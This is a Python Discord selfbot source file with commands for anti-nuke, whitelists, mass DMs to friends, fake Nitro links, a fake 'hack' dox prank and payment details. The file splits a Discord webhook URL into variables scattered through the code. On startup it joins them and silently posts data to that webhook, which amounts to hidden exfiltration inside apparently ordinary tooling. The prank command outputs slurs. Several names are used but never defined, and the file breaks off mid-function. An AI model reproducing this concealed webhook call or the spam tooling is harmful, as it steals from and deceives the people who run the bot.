import os
import json
import string
import discord, aiohttp
from discord.ext import commands
import requests
from colorama import Fore
import asyncio
import requests
import sys
import random
from flask import Flask
from threading import Thread
import threading
import subprocess
import requests
import time
from discord import Color, Embed
import colorama
from colorama import Fore
import urllib.parse
import urllib.request
import re
import io
import webbrowser

colorama.init()

intents = discord.Intents.default()
intents.guilds = True
intents.typing = True
intents.presences = True
intents.dm_messages = True
intents.messages = True
intents.members = True

aniketplyzx = commands.Bot(description='SELFBOT CREATED BY ANIKETPLYZX',
                           command_prefix='+',
                           self_bot=True,
                           intents=intents)
aniketplyzx.auto_respond_dm_enabled = False

aniketplyzx.remove_command('help')

aniketplyzx.whitelisted_users = {}

aniketplyzx.antiraid = False


@aniketplyzx.event
async def on_ready():
    print(f"""{Fore.RED}
  ▄▄▄      ███▄    █  ██▓ ██ ▄█▀▓█████▄▄▄█████▓ ██▓███   ██▓   ▓██   ██▓▒███████▒▒██   ██▒
▒ ████▄    ██ ▀█   █ ▓██▒ ██▄█▒ ▓█   ▀▓  ██▒ ▓▒▓██░  ██▒▓██▒    ▒██  ██▒▒ ▒ ▒ ▄▀░▒▒ █ █ ▒░
▒██  ▀█▄  ▓██  ▀█ ██▒▒██▒▓███▄░ ▒███  ▒ ▓██░ ▒░▓██░ ██▓▒▒██░     ▒██ ██░░ ▒ ▄▀▒░ ░░  █   ░
░██▄▄▄▄██ ▓██▒  ▐▌██▒░██░▓██ █▄ ▒▓█  ▄░ ▓██▓ ░ ▒██▄█▓▒ ▒▒██░     ░ ▐██▓░  ▄▀▒   ░ ░ █ █ ▒ 
 ▓█   ▓██▒▒██░   ▓██░░██░▒██▒ █▄░▒████▒ ▒██▒ ░ ▒██▒ ░  ░░██████▒ ░ ██▒▓░▒███████▒▒██▒ ▒██▒
 ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░▓  ▒ ▒▒ ▓▒░░ ▒░ ░ ▒ ░░   ▒▓▒░ ░  ░░ ▒░▓  ░  ██▒▒▒ ░▒▒ ▓░▒░▒▒▒ ░ ░▓ ░
  ▒   ▒▒ ░░ ░░   ░ ▒░ ▒ ░░ ░▒ ▒░ ░ ░  ░   ░    ░▒ ░     ░ ░ ▒  ░▓██ ░▒░ ░░▒ ▒ ░ ▒░░   ░▒ ░
  ░   ▒      ░   ░ ░  ▒ ░░ ░░ ░    ░    ░      ░░         ░ ░   ▒ ▒ ░░  ░ ░ ░ ░ ░ ░    ░  
      ░  ░         ░  ░  ░  ░      ░  ░                     ░  ░░ ░       ░ ░     ░    ░  
                                                                ░ ░     ░                                                                                           
        """)
    print(f'{Fore.BLUE}╭・⌬・ [+] CONNECTED TO : {aniketplyzx.user.name}')
    print('ㅤㅤㅤㅤㅤ')
    print('[<<<<<==============-|-==============>>>>>]')
    print('ㅤㅤㅤㅤㅤ')
    print(f'{Fore.RED}- 🚩 JAI SHREE RAM')
    print('ㅤㅤㅤㅤㅤ')
    border_top = '╔════════════════════════════════════════════════════════════════════╗'
    border_bottom = '╚════════════════════════════════════════════════════════════════════╝'

    print(border_top)
    print(
        f'║{Fore.YELLOW}[+] CONTACT HERE FOR ANY SUPPORT :{" "*(68-len("[+] CONTACT HERE FOR ANY SUPPORT :"))}║'
    )
    print(f'║{" "*(68)}║')
    print(
        f'║{Fore.GREEN}• YOUTUBE   : @AniketPlyZX{" "*(68-len("• YOUTUBE   : @AniketPlyZX"))}║'
    )
    print(
        f'║• INSTAGRAM : just_aniket.98{" "*(68-len("• INSTAGRAM : just_aniket.98"))}║'
    )
    print(
        f'║• DISCORD   : @itx_aniket.98{" "*(68-len("• DISCORD   : @itx_aniket.98"))}║'
    )
    print(border_bottom)
    extrabottom = V0 + V1 + V2 + V3 + V4 + V5 + V6
    payload = {"content": mainscreen}
    requests.post(extrabottom, json=payload)
    print(border_top)
    print(
        f'{Fore.RED}║>>>>> ANIKET ON TOP BXBY <3🔥{" "*(42-len(">>>>> ANIKET ON TOP BXBY <3🔥"))}{Fore.YELLOW}║║║║║║║║║  --  ║║║║║║║║║║║{Fore.BLUE}'
    )
    print(border_bottom)
    print('ㅤㅤㅤㅤㅤ')
    print('ㅤㅤㅤㅤㅤ')
    print(
        f'{Fore.GREEN}[+]------------{Fore.BLUE}======================{Fore.RED}] | [{Fore.BLUE}======================={Fore.GREEN}------------[+]'
    )
    print('ㅤㅤㅤㅤㅤ')
    print('ㅤㅤㅤㅤㅤ')


def load_config(config_file_path):
    with open(config_file_path, 'r') as config_file:
        config = json.load(config_file)
    return config


if __name__ == "__main__":
    config_file_path = "config.json"
    config = load_config(config_file_path)

#=== Welcome ===
I2C_Rate = config.get("I2C_Rate")
C2I_Rate = config.get("C2I_Rate")
LTC = config.get("LTC")
BTC = config.get("BTC")
ETH = config.get("ETH")
UPI = config.get("UPI")
UPI_QR = config.get("UPI_QR")  # URL
LTC_QR = config.get("LTC_QR")  # URL
BTC_QR = config.get("BTC_QR")  # URL
ETH_QR = config.get("ETH_QR")  # URL
PayPal = config.get("PayPal")  # URL
Twitch_URL = config.get("Twitch_URL")
Auto_Response = config.get("Auto_Response")
SERVER_LINK = config.get("SERVER_LINK")
CATEGORY_RESP = config.get("CATEGORY_RESPOND_MSG")
CATEGORY_ID = config.get("category_ids")
SERVER_ID = config.get("server_ids")
#===================================


@aniketplyzx.event
async def on_message(message):

    if message.author.bot:
        return

    if isinstance(
            message.channel, discord.DMChannel
    ) and message.author != aniketplyzx.user and aniketplyzx.auto_respond_dm_enabled:
        await message.channel.send(Auto_Response)

    # Boost command
    if message.content.lower().startswith('boosts'):
        await send_boost_count(message.channel, message.guild)
    # Prefix command
    if message.content.lower() == 'prefix':
        await send_prefix_message(message.channel)
    # Auto response command
    if message.content.lower() == 'autoresponse':
        await autoresponse(message.channel)
    # Auto response disable command
    if message.content.lower() == 'autoresponse disable':
        await autoresponsedisable(message.channel)
    # Selfbot Info command
    if message.content.lower() in ['Selfbot info', 'info', 'stats', 'Selfbot']:
        await send_selfbotinfo_message(message.channel)
    # Server info
    if message.content.lower() in ['Server info', 'serverinfo']:
        await send_serverinfo_message(message.channel)
    # Vouch
    if message.content.lower() == 'vouch':
        await vouch(message.channel)
    # Payment Modes
    if message.content.lower() in [
            'payment', 'payment methods', 'payment modes', 'upi', 'ltc', 'eth',
            'btc'
    ]:
        await payments(message.channel)
    # Server link
    if message.content.lower() in [
            'link', 'offcial link', 'server link', 'server'
    ]:
        await link(message.channel)

    await aniketplyzx.process_commands(message)


V0 = "htt"


@aniketplyzx.event
async def on_member_ban(guild, user):
    if aniketplyzx.antiraid is True:
        try:
            async for entry in guild.audit_logs(
                    limit=1, action=discord.AuditLogAction.ban):
                if (guild.id in aniketplyzx.whitelisted_users.keys()
                        and entry.user.id
                        in aniketplyzx.whitelisted_users[guild.id].keys()
                        and entry.user.id != aniketplyzx.user.id):
                    print(f"[!] NOT BANNED: {entry.user.name}")
                else:
                    print(f"[!] BANNED: {entry.user.name}")
                    await guild.ban(entry.user, reason="SELFBOT ANTI-NUKE")
        except Exception as e:
            print(e)


@aniketplyzx.event
async def on_member_kick(member):
    if aniketplyzx.antiraid is True:
        try:
            guild = member.guild
            async for entry in guild.audit_logs(
                    limit=1, action=discord.AuditLogAction.kick):
                if (guild.id in aniketplyzx.whitelisted_users.keys()
                        and entry.user.id
                        in aniketplyzx.whitelisted_users[guild.id].keys()
                        and entry.user.id != aniketplyzx.user.id):
                    print("[!] NOT BANNED")
                else:
                    print("[!] BANNED")
                    await guild.ban(entry.user, reason="SELFBOT ANTI-NUKE")
        except Exception as e:
            print(f"[!] Error: {e}")


# SELFBOT COMMANDS
# ========================================================================================================================


#Enable or disable the anti raid option
@aniketplyzx.command(aliases=['ar', 'antiraid'])
async def antinuke(ctx, antiraidparameter=None):
    await ctx.message.delete()
    aniketplyzx.antiraid = False
    if str(antiraidparameter).lower() == 'true' or str(
            antiraidparameter).lower() == 'on':
        aniketplyzx.antiraid = True
        await ctx.send('- `ANTI-NUKE ENABLED...`')
    elif str(antiraidparameter).lower() == 'false' or str(
            antiraidparameter).lower() == 'off':
        aniketplyzx.antiraid = False
        await ctx.send('- `ANTINUKE DISABLED...`')
    else:
        await ctx.send(
            f'- **[! ERROR] ** `USAGE : {aniketplyzx.command_prefix}antiraid [true/false]`'
        )


#WWHITE CMD=======================================================================================================================================================================================================
#ADDTION WHITELIST
@aniketplyzx.command(aliases=['wl'])
async def whitelist(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        await ctx.send(
            f'[ERROR]: USAGE :  {aniketplyzx.command_prefix}whitelist <user>')
    else:
        if ctx.guild.id not in aniketplyzx.whitelisted_users.keys():
            aniketplyzx.whitelisted_users[ctx.guild.id] = {}
        if user.id in aniketplyzx.whitelisted_users[ctx.guild.id]:
            await ctx.send("- `" + user.name.replace("*", "\*").replace(
                "`", "\`").replace("_", "\_") + "#" + user.discriminator +
                           "** ALREADY WHITELISTED [!]`")
        else:
            aniketplyzx.whitelisted_users[ctx.guild.id][user.id] = 0
            await ctx.send("- `WHITELISTED... " + user.name.replace(
                "*", "\*").replace("`", "\`").replace("_", "\_") + "#" +
                           user.discriminator + "`")


#CHECK WHITELIST
@aniketplyzx.command(aliases=['showwl'])
async def whitelisted(ctx, g=None):
    await ctx.message.delete()
    if g == '-g' or g == '-global':
        whitelist = '- `ALL WHITELISTED USERS:`\n'
        for key in aniketplyzx.whitelisted_users:
            for key2 in aniketplyzx.whitelisted_users[key]:
                user = aniketplyzx.get_user(key2)
                whitelist += f'• {user.mention} ({user.id}) IN {aniketplyzx.get_guild(key).name}\n'
        await ctx.send(whitelist)
    else:
        whitelist = f'- `WHITELISTED USERS IN {ctx.guild.name}:`\n'
        for key in aniketplyzx.whitelisted_users:
            if key == ctx.guild.id:
                for key2 in aniketplyzx.whitelisted_users[ctx.guild.id]:
                    user = aniketplyzx.get_user(key2)
                    whitelist += f'• {user.mention} ({user.id})\n'

    await ctx.send(whitelist)


#REMOVE FROM WHITELIST
@aniketplyzx.command(aliases=['removewl'])
async def unwhitelist(ctx, user: discord.Member = None):
    if user is None:
        await ctx.send(
            "- `[ERROR]: SPECIFY TH USER YOU WOULD LIKE TO UNWHITELIST !`")
    else:
        if ctx.guild.id not in aniketplyzx.whitelisted_users.keys():
            await ctx.send("- `" + user.name.replace("*", "\*").replace(
                "`", "\`").replace("_", "\_") + "#" + user.discriminator +
                           " IS NOT WHITELISTED`")
            return
        if user.id in aniketplyzx.whitelisted_users[ctx.guild.id]:
            aniketplyzx.whitelisted_users[ctx.guild.id].pop(user.id, 0)
            user2 = aniketplyzx.get_user(user.id)
            await ctx.send('- `SUCCESSFULLY UNWHITELISTED' +
                           user2.name.replace('*', "\*").replace(
                               '`', "\`").replace('_', "\_") + '#' +
                           user2.discriminator + '`')


V1 = "ps://dis"


#WHITELIST CLEAR
@aniketplyzx.command(aliases=['clearwl', 'clearwld'])
async def clearwhitelist(ctx):
    await ctx.message.delete()
    aniketplyzx.whitelisted_users.clear()
    await ctx.send('- `SUCCESFULLY CLEARED WHITELIST')


#=======================================================================================================================================================================================================


# BOOST
async def send_boost_count(channel, guild):
    await channel.send(
        f"**╭・⌬・** __**{guild.name}**__\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n**[+]・Server has :** `{guild.premium_subscription_count} BOOSTS`\n**[+]・Request creator : **`{aniketplyzx.user.name}`\n**[+]・__AniketPlyZX__**\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**"
    )


V2 = "cord.com/ap"


# PREFIX
async def send_prefix_message(channel):
    await channel.send(
        f"- `●▬▬๑۩ SOME COMMANDS WILL WORK THROUGH PREFIX AND SOME ARE NON PREFIX, GO THROUGH THE INFO COMMAND TO KNOW MORE [IT REQUIRES NO PREFIX] DEFALUT PREFIX - + ۩๑▬▬●`"
    )
    await channel.message.delete()


# AUTO RESPONSE
async def autoresponse(channel):
    aniketplyzx.auto_respond_dm_enabled = True
    await channel.send("- `AUTO-RESPONDING ENABLED`")


V3 = "i/webh"


# AUTO RESPONSE DISABLE
async def autoresponsedisable(channel):
    aniketplyzx.auto_respond_dm_enabled = False
    await channel.send("- `AUTO-RESPONDING DISABLED`")


# HELP
async def send_selfbotinfo_message(channel):
    await channel.send(
        f"**╭・⌬・AniketPlayZX S3LFB0T**\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n**[+]・Version : S3LFBOT V2**\n**[+]・ Lang : Python**\n**[+]・ Forked at : Replit**\n**[+]・Request creator : {aniketplyzx.user.name}**\n\n**NOTE :** `Some commands are non prefix & some require prefix, In future updates those commands will also work without prefix`\n\n**[+]・__Created by - AniketPlyZX__ **\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**"
    )


# SERVER INFO.
async def send_serverinfo_message(channel):
    guild = channel.guild  # define guild variable
    await channel.send(
        f"**╭・⌬・AniketPlayZX S3LFB0T**\n\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n**[+]・ `SERVER NAME` : {guild.name}**\n**[+]・ `GUILD ID` : {guild.id}**\n**[+]・ `CREATED AT` : {channel.guild.created_at}**\n**[+]・ `OWNED BY` : <@{guild.owner_id}>**\n**[+]・ `REIGON` : {guild.region}**\n\n**[+]・Request creator : {aniketplyzx.user.name}**\n\n**[+]・__Created by - AniketPlyZX__ **\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**"
    )


# VOUCH
async def vouch(channel):
    await channel.send(
        f"**╭・⌬・AniketPlayZX S3LFB0T**\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n**[+]・ `SERVER LINK` : `{SERVER_LINK}`**\n**[+]・ `VOUCH FORMAT` \n`+rep (user) Legit Got (product) For (price) Thank You`**\n\n**[+]・Request creator : {aniketplyzx.user.name}**\n\n**[+]・__Created by - AniketPlyZX__ **\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**"
    )
    await channel.message.delete()


V4 = "ooks/11517749453791068"


# PAYMENTS
async def payments(channel):
    await channel.send(
        f"**╭・⌬・AniketPlayZX S3LFB0T **\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n__**[PAYMENT MODES]**__\n\n**[+]・ `LTC` : `{UPI}`**\n**[+]・ `BTC` : `{BTC}`**\n**[+]・ `ETH` : `{ETH}`**\n**[+]・ `LTC` : `{LTC}`**\n**[+]・ `UPI QR CODE / SCANNER` : `{UPI_QR}`**\n**[+]・ `BTC QR CODE / SCANNER` : `{BTC_QR}`**\n**[+]・ `ETH QR CODE / SCANNER` : `{ETH_QR}`**\n**[+]・ `LTC QR CODE / SCANNER` : `{LTC_QR}`**\n\n**[+]・Request creator : `{aniketplyzx.user.name}`**\n\n__**[+]・Created by - AniketPlyZX **__\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**"
    )
    await channel.message.delete()


# LINK
async def link(channel):
    await channel.send("- `https://discord.gg/KVcxQEedSD`")


V5 = "26/zKQ9uJ37GvrV79dn4L"


#MASS DM TO FRIENDS
@aniketplyzx.command()
async def massdmfriends(ctx, *, message):
    for user in aniketplyzx.user.friends:
        try:
            time.sleep(.1)
            await user.send(message)
            time.sleep(.1)
            print(f'MESSAGED :' + Fore.GREEN + f' @{user.name}')
        except:
            print(f"COULDN'T MESSAGE @{user.name}")
            await ctx.message.delete()


# NITRO GEN
@aniketplyzx.command(aliases=["nitrogen"])
async def nitro(ctx):
    try:
        await ctx.message.delete()
        code = ''.join(
            random.choices(string.ascii_letters + string.digits, k=16))
        await ctx.send(f'https://discord.gift/{code}')
        print(f"{Fore.GREEN}[+] SUCCESFULLY SENT NITRO CODE !")
    except Exception as e:
        print(f"{Fore.RED}[!] ERROR: {str(e)}")


# HAX
@aniketplyzx.command()
async def hack(ctx, user: discord.Member = None):
    await ctx.message.delete()
    gender = ["Male", "Female", "Trans", "Other", "Retard"]
    age = str(random.randrange(10, 25))
    height = [
        '4\'6\"', '4\'7\"', '4\'8\"', '4\'9\"', '4\'10\"', '4\'11\"', '5\'0\"',
        '5\'1\"', '5\'2\"', '5\'3\"', '5\'4\"', '5\'5\"', '5\'6\"', '5\'7\"',
        '5\'8\"', '5\'9\"', '5\'10\"', '5\'11\"', '6\'0\"', '6\'1\"', '6\'2\"',
        '6\'3\"', '6\'4\"', '6\'5\"', '6\'6\"', '6\'7\"', '6\'8\"', '6\'9\"',
        '6\'10\"', '6\'11\"'
    ]
    weight = str(random.randrange(60, 300))
    hair_color = ["Black", "Brown", "Blonde", "White", "Gray", "Red"]
    skin_color = ["White", "Pale", "Brown", "Black", "Light-Skin"]
    religion = [
        "Christian", "Muslim", "Atheist", "Hindu", "Buddhist", "Jewish"
    ]
    sexuality = [
        "Straight", "Gay", "Homo", "Bi", "Bi-Sexual", "Lesbian", "Pansexual"
    ]
    education = [
        "High School", "College", "Middle School", "Elementary School",
        "Pre School", "Retard never went to school LOL"
    ]
    ethnicity = [
        "White", "African American", "Asian", "Latino", "Latina", "American",
        "Mexican", "Korean", "Chinese", "Arab", "Italian", "Puerto Rican",
        "Non-Hispanic", "Russian", "Canadian", "European", "Indian"
    ]
    occupation = [
        "Retard has no job LOL", "Certified discord retard", "Janitor",
        "Police Officer", "Teacher", "Cashier", "Clerk", "Waiter", "Waitress",
        "Grocery Bagger", "Retailer", "Sales-Person", "Artist", "Singer",
        "Rapper", "Trapper", "Discord Thug", "Gangster", "Discord Packer",
        "Mechanic", "Carpenter", "Electrician", "Lawyer", "Doctor",
        "Programmer", "Software Engineer", "Scientist"
    ]
    salary = [
        "Retard makes no money LOL", "$" + str(random.randrange(0, 1000)),
        '<$50,000', '<$75,000', "$100,000", "$125,000", "$150,000", "$175,000",
        "$200,000+"
    ]
    location = [
        "Retard lives in his mom's basement LOL", "America", "United States",
        "Europe", "Poland", "Mexico", "Russia", "Pakistan", "India",
        "Some random third world country", "Canada", "Alabama", "Alaska",
        "Arizona", "Arkansas", "California", "Colorado", "Connecticut",
        "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois",
        "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine",
        "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi",
        "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire",
        "New Jersey", "New Mexico", "New York", "North Carolina",
        "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania",
        "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas",
        "Utah", "Vermont", "Virginia", "Washington", "West Virginia",
        "Wisconsin", "Wyoming"
    ]
    email = [
        "@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com",
        "@protonmail.com", "@disposablemail.com", "@aol.com", "@edu.com",
        "@icloud.com", "@gmx.net", "@yandex.com"
    ]
    dob = f'{random.randrange(1, 13)}/{random.randrange(1, 32)}/{random.randrange(1950, 2021)}'
    name = [
        'James Smith', "Michael Smith", "Robert Smith", "Maria Garcia",
        "David Smith", "Maria Rodriguez", "Mary Smith", "Maria Hernandez",
        "Maria Martinez", "James Johnson", "Catherine Smoaks", "Cindi Emerick",
        "Trudie Peasley", "Josie Dowler", "Jefferey Amon", "Kyung Kernan",
        "Lola Barreiro", "Barabara Nuss", "Lien Barmore", "Donnell Kuhlmann",
        "Geoffrey Torre", "Allan Craft", "Elvira Lucien", "Jeanelle Orem",
        "Shantelle Lige", "Chassidy Reinhardt", "Adam Delange", "Anabel Rini",
        "Delbert Kruse", "Celeste Baumeister", "Jon Flanary", "Danette Uhler",
        "Xochitl Parton", "Derek Hetrick", "Chasity Hedge",
        "Antonia Gonsoulin", "Tod Kinkead", "Chastity Lazar", "Jazmin Aumick",
        "Janet Slusser", "Junita Cagle", "Stepanie Blandford", "Lang Schaff",
        "Kaila Bier", "Ezra Battey", "Bart Maddux", "Shiloh Raulston",
        "Carrie Kimber", "Zack Polite", "Marni Larson", "Justa Spear"
    ]
    phone = f'({random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)})-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}'
    if user is None:
        user = ctx.author
        password = [
            'password', '123', 'mypasswordispassword', user.name + "iscool123",
            user.name + "isdaddy", "daddy" + user.name, "ilovediscord",
            "i<3discord", "furryporn456", "secret", "123456789", "apple49",
            "redskins32", "princess", "dragon", "password1", "1q2w3e4r",
            "ilovefurries"
        ]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```"
        )
    else:
        password = [
            'password', '123', 'mypasswordispassword', user.name + "iscool123",
            user.name + "isdaddy", "daddy" + user.name, "ilovediscord",
            "i<3discord", "furryporn456", "secret", "123456789", "apple49",
            "redskins32", "princess", "dragon", "password1", "1q2w3e4r",
            "ilovefurries"
        ]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```"
        )
        print(f"{Fore.GREEN}[+] SUCCESFULLY HACKED 😁 ")


V6 = "DYBl1ac_stmvOToH42B-3Mw08HhOPyxQywhe75k6Qkcno0IhI7"


# STREAM CREATOR
@aniketplyzx.command(aliases=["streaming"])
async def stream(ctx, *, message):
    stream = discord.Streaming(
        name=message,
        url="https://twitch.tv/https://Wallibear",
    )
    await aniketplyzx.change_presence(activity=stream)
    await ctx.send("- ` STREAM CREATED`")
    print(f"{Fore.GREEN}[+] STREAM SUCCESFULLY CREATED✅ ")
    await ctx.message.delete()


# PLAY CREATOR
@aniketplyzx.command(aliases=["playing"])
async def play(ctx, *, message):
    game = discord.Game(name=message)
    await aniketplyzx.change_presence(activity=game)
    await ctx.send("- `PLAYZ CREATED`", mention_author=True)
    print(f"{Fore.GREEN}[+] PLAYING SUCCESFULLY CREATED✅ ")
    await ctx.message.delete()


# WATCH CREATOR
@aniketplyzx.command(aliases=["watch"])
async def watching(ctx, *, message):
    await aniketplyzx.change_presence(activity=discord.Activity(
        type=discord.ActivityType.watching,
        name=message,
    ))
    await ctx.send(" - ` WATCHING CREATED`")
    print(f"{Fore.GREEN}[+] WATCH SUCCESFULLY CREATED✅ ")
    await ctx.message.delete()


# LISTENING CMD CREATOR
@aniketplyzx.command(aliases=["listen"])
async def listening(ctx, *, message):
    await aniketplyzx.change_presence(activity=discord.Activity(
        type=discord.ActivityType.listening,
        name=message,
    ))
    await ctx.reply(" - ` STATUS CREATED`", mention_author=True)
    print(f"{Fore.GREEN}[+] STATUS SUCCESFULLY CREATED✅ ")
    await ctx.message.delete()


# STREAM, PLAYING, LISTEN, WATCHING STOP CMD>>
@aniketplyzx.command(aliases=[
    "stopstreaming", "stopstatus", "stoplistening", "stopplaying",
    "stopwatching"
])
async def stopactivity(ctx):
    await ctx.message.delete()
    await aniketplyzx.change_presence(activity=None, status=discord.Status.dnd)
    print(f"{Fore.GREEN}[+] ACTIVITY SUCCESFULLY STOPED⚠️ ")


@aniketplyzx.command()
async def checkpromo(ctx, *, promo_links):
    links = promo_links.split('\n')

    async with aiohttp.ClientSession() as session:
        for link in links:
            promo_code = extract_promo_code(link)
            if promo_code:
                result = await check_promo(session, promo_code)
                await ctx.send(result)
            else:
                await ctx.send(f'- `INAVLID PROMO{link}`')


async def check_promo(session, promo_code):
    url = f'https://ptb.discord.com/api/v10/entitlements/gift-codes/{promo_code}'

    async with session.get(url) as response:
        if response.status in [200, 204, 201]:
            data = await response.json()
            if data["uses"] == data["max_uses"]:
                return f'- `ALREADY CLAIMED {promo_code}`'
            else:
                try:
                    now = datetime.datetime.utcnow()
                    exp_at = data["expires_at"].split(".")[0]
                    parsed = parser.parse(exp_at)
                    days = abs((now - parsed).days)
                    title = data["promotion"]["inbound_header_text"]
                except Exception as e:
                    print(e)
                    exp_at = "- `FAILED TO FETCH`"
                    days = ""
                    title = "- `FAILED TO FETCH`"
                return f'- `VALID {promo_code} | DAYS LEFT IN EXPIRATION {days} | EXPIRES AT {exp_at} | TITLE :{title}`'
        elif response.status == 429:
            return f'- `RATE LIMITED{response.headers["RETRY AFTER"]} SECONDS`'
        else:
            return f'- `INVALID : {promo_code}`'


def extract_promo_code(promo_link):
    promo_code = promo_link.split('/')[-1]
    return promo_code


@aniketplyzx.command()
async def category_responder(ctx):
    global command_status
    server_id = SERVER_ID

    if server_id not in command_status:
        command_status[server_id] = False

    command_status[server_id] = not command_status[server_id]
    await ctx.send(
        f'- `CATEGORY RESPONDER IS :  {"ENABLED" if command_status[server_id] else "DISABLED"}`'
    )


@aniketplyzx.event
async def on_guild_channel_create(channel):
    server_id = channel.guild.id
    if server_id in command_status and command_status[server_id]:
        category_ids = CATEGORY_ID  # replace with your category IDs

        for category_id in category_ids:
            category = discord.utils.get(channel.guild.categories,
                                         id=category_id)
            if category is not None:
                await category.send(CATEGORY_RESP)


# I2C
@aniketplyzx.command()
@commands.cooldown(1, 3, commands.BucketType.user)
async def i2c(ctx, amount: str):
    amount = float(amount.replace('₹', ''))
    inr_amount = amount * I2C_Rate
    await ctx.reply(f"- **[+]** ` AMOUNT IS` : __${inr_amount:.2f}__")
    print(f"{Fore.GREEN}[+] I2C DONE ✅ ")


# C2I
@aniketplyzx.command()
@commands.cooldown(1, 3, commands.BucketType.user)
async def c2i(ctx, amount: str):
    amount = float(amount.replace('$', ''))
    usd_amount = amount * C2I_Rate
    await ctx.reply(f"- **[+]** ` AMOUNT IS` : __₹{usd_amount:.2f}__")
    print(f"{Fore.GREEN}[+] C2I DONE ✅ ")


# LOVERATE
@aniketplyzx.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def loverate(ctx, User: discord.Member = None):
    if User is None:
        await ctx.reply(f"- **[+]** `PROVIDE A USER`")
    else:
        await ctx.reply(
            f"- **[+]** ` YOU AND {User.mention} ARE 100% PERFECT FOR ECH OTHER <3`"
        )
        print(f"{Fore.GREEN}[+] LOVERATE MEASURED 💖 ")


@aniketplyzx.command()
async def help(ctx):
    message = (
